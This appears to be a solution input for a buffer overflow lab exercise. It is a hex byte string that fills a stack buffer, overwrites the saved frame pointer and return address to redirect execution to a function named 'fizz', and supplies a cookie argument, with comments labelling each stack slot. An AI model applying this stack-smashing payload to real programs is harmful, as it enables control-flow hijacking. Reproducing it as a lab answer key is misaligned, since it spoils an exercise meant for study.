41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 44 45 46 47 48 49 4a
41 42 43 /* end of buffer:whatever */ 
60 37 68 55 /* saved ebp of caller:whatever */ 
02 94 04 08 /* caller's next eip-> fizz's eip */
84 95 04 08 /* ret of fizz:eip */
bf 4d f1 61 /* argcs of fizz:cookie */
